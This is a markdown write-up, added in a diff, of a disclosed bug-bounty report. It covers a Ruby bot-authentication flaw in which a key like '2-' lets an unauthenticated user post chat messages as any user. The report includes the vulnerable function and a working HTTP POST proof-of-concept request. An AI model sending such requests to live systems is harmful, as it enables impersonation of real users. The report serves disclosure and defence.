@@ -1,0 +1,116 @@
+# Improper bot-authentication allows to impersonate any user when sending messages in a room
+
+## Metadata
+- **Source:** HackerOne
+- **Report:** 3329310 | https://hackerone.com/reports/3329310
+- **Submitted:** 2025-09-06
+- **Reporter:** stackered
+- **Program:** Unknown
+- **Bounty:** $2,000
+- **Severity:** high
+- **Vuln:** Improper Authentication - Generic
+- **CVEs:** None
+- **Category:** auth-crypto
+
+## Summary
+Bots are allowed to send messages in rooms but require a bot key to authenticate.
+The bot key authentication function is as follows:
+
+```ruby
+def authenticate_bot(bot_key)
+  bot_id, bot_token = bot_key.split("-")
+  active.find_by(id: bot_id, bot_token: bot_token)
+end
+```
+
+The issue is that if `bot_key` has no right-hand side (ex: `1-`), `bot_token` will be `nil`, and the query will match a `User` 
+
+## Attack scenario
+*(see original)*
+
+## Root cause
+*(see original)*
+
+## Attacker mindset
+*(see original)*
+
+## Defensive takeaways
+*(see original)*
+
+## Variant hunting
+*(see original)*
+
+## MITRE ATT&CK
+*(see original)*
+
+## Notes
+*(see original)*
+
+## Full report
+<details><summary>Expand</summary>
+
+Bots are allowed to send messages in rooms but require a bot key to authenticate.
+The bot key authentication function is as follows:
+
+```ruby
+def authenticate_bot(bot_key)
+  bot_id, bot_token = bot_key.split("-")
+  active.find_by(id: bot_id, bot_token: bot_token)
+end
+```
+
+The issue is that if `bot_key` has no right-hand side (ex: `1-`), `bot_token` will be `nil`, and the query will match a `User` record if `bot_id` matches a valid ID.
+
+IDs are incremental, as can be seen in the rails console, so they can be guessed easily. They are also visible in some URLs.
+
+```
+campfire(prod):038> User.active
+=> 
+[#<User:0x00007a444e940f18
+  id: 1,
+  name: "enoent",
+  created_at: "2025-09-06 11:59:41.505220000 +0000",
+  updated_at: "2025-09-06 14:08:08.788258000 +0000",
+  role: "administrator",
+  email_address: "[FILTERED]",
+  password_digest: "[FILTERED]",
+  active: true,
+  bio: "<s>ddqsdqsds</s>",
+  bot_token: nil>,
+ #<User:0x00007a444e940dd8
+  id: 2,
+  name: "test",
+  created_at: "2025-09-06 13:24:29.113250000 +0000",
+  updated_at: "2025-09-06 13:42:26.539909000 +0000",
+  role: "member",
+  email_address: "[FILTERED]",
+  password_digest: "[FILTERED]",
+  active: true,
+  bio: nil,
+  bot_token: nil>,
+ #<User:0x00007a444e940c98
+```
+
+The following request highlights the issue, as it allows an unauthenticated user to impersonate another user (here with ID `2`) and post messages on their behalf:
+
+```
+POST /rooms/2/2-/messages HTTP/1.1
+Host: localhost:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
+Accept: text/vnd.turbo-stream.html, text/html, application/xhtml+xml
+Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+Content-Length: 193
+
+Hello ! I'm the test user, even though I'm not authenticated
+```
+
+The attached image shows that the message was successfully posted and appears to come from the "test" user.
+
+## Impact
+
+An unauthenticated user can send arbitrary messages as any user, in rooms the impersonated user have access to.
+
+</details>
+
+---
+*Analysed by Claude on 2026-05-24*
